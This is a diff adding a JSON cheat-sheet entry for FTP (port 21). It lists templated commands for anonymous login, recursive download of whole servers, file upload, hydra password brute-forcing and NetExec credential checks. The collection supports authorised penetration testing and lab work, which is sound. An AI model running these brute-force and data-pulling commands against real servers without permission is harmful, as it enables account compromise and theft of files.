@@ -1,0 +1,138 @@
+{
+  "port": 21,
+  "protocol": "tcp",
+  "service": "FTP",
+  "description": "File Transfer Protocol — anonymous access, file exfiltration, credential brute-forcing, and recursive downloads.",
+  "tools": [
+    {
+      "name": "ftp (native client)",
+      "description": "Built-in FTP client for interactive file browsing and transfer.",
+      "commands": [
+        {
+          "title": "Anonymous login",
+          "command": "ftp {{IP}}",
+          "description": "Connect and login as 'anonymous' with an empty password (or any email)."
+        },
+        {
+          "title": "Authenticated login",
+          "command": "ftp {{IP}}",
+          "description": "Connect and login with username and password at the prompt."
+        },
+        {
+          "title": "Anonymous login (one-liner)",
+          "command": "echo -e 'open {{IP}}\\nuser anonymous\\npass\\nls -la\\nbye' | ftp -n",
+          "description": "Scripted anonymous FTP login to list files and disconnect."
+        },
+        {
+          "title": "Download a file (in session)",
+          "command": "get {{FILENAME}}",
+          "description": "Download a file from the FTP server (run inside ftp session)."
+        },
+        {
+          "title": "Upload a file (in session)",
+          "command": "put {{LOCAL_FILE}}",
+          "description": "Upload a local file to the FTP server (run inside ftp session)."
+        },
+        {
+          "title": "Binary mode transfer (in session)",
+          "command": "binary",
+          "description": "Switch to binary transfer mode for non-text files (run inside ftp session)."
+        }
+      ]
+    },
+    {
+      "name": "wget — Recursive FTP Download",
+      "description": "Download entire FTP directory trees recursively.",
+      "commands": [
+        {
+          "title": "Anonymous recursive download",
+          "command": "wget -r -np ftp://anonymous:anonymous@{{IP}}/",
+          "description": "Recursively download all files from an anonymous FTP server."
+        },
+        {
+          "title": "Authenticated recursive download",
+          "command": "wget -r -np ftp://{{USERNAME}}:{{PASSWORD}}@{{IP}}/",
+          "description": "Recursively download all files with credentials."
+        },
+        {
+          "title": "Download specific directory",
+          "command": "wget -r -np ftp://anonymous:anonymous@{{IP}}/{{DIRECTORY}}/",
+          "description": "Recursively download a specific directory."
+        },
+        {
+          "title": "Mirror entire FTP site",
+          "command": "wget -m ftp://anonymous:anonymous@{{IP}}/",
+          "description": "Mirror the entire FTP site with timestamps."
+        }
+      ]
+    },
+    {
+      "name": "curl — FTP",
+      "description": "Versatile command-line tool for FTP file operations.",
+      "commands": [
+        {
+          "title": "List directory (anonymous)",
+          "command": "curl ftp://{{IP}}/",
+          "description": "List the root directory of an anonymous FTP server."
+        },
+        {
+          "title": "List directory (authenticated)",
+          "command": "curl -u '{{USERNAME}}:{{PASSWORD}}' ftp://{{IP}}/",
+          "description": "List directory with credentials."
+        },
+        {
+          "title": "Download a file",
+          "command": "curl ftp://{{IP}}/{{FILENAME}} -o {{FILENAME}}",
+          "description": "Download a specific file from the FTP server."
+        },
+        {
+          "title": "Upload a file",
+          "command": "curl -T {{LOCAL_FILE}} -u '{{USERNAME}}:{{PASSWORD}}' ftp://{{IP}}/",
+          "description": "Upload a local file to the FTP server."
+        }
+      ]
+    },
+    {
+      "name": "hydra — FTP Brute-force",
+      "description": "Fast network brute-forcer for FTP credentials.",
+      "commands": [
+        {
+          "title": "Single user with wordlist",
+          "command": "hydra -l '{{USERNAME}}' -P {{WORDLIST}} ftp://{{IP}}",
+          "description": "Brute-force FTP password for a single user."
+        },
+        {
+          "title": "User list with wordlist",
+          "command": "hydra -L {{USERLIST}} -P {{WORDLIST}} ftp://{{IP}}",
+          "description": "Brute-force FTP with user and password lists."
+        },
+        {
+          "title": "Single credential check",
+          "command": "hydra -l '{{USERNAME}}' -p '{{PASSWORD}}' ftp://{{IP}}",
+          "description": "Verify a single FTP credential pair."
+        },
+        {
+          "title": "With verbose and threads",
+          "command": "hydra -l '{{USERNAME}}' -P {{WORDLIST}} ftp://{{IP}} -V -t 8",
+          "description": "Brute-force with verbose output and 8 threads."
+        }
+      ]
+    },
+    {
+      "name": "NetExec (nxc) — FTP",
+      "description": "FTP credential validation via NetExec.",
+      "commands": [
+        {
+          "title": "Check anonymous access",
+          "command": "nxc ftp {{IP}} -u 'anonymous' -p ''",
+          "description": "Test if anonymous FTP access is allowed."
+        },
+        {
+          "title": "Authenticate with credentials",
+          "command": "nxc ftp {{IP}} -u '{{USERNAME}}' -p '{{PASSWORD}}'",
+          "description": "Validate FTP credentials."
+        }
+      ]
+    }
+  ]
+}
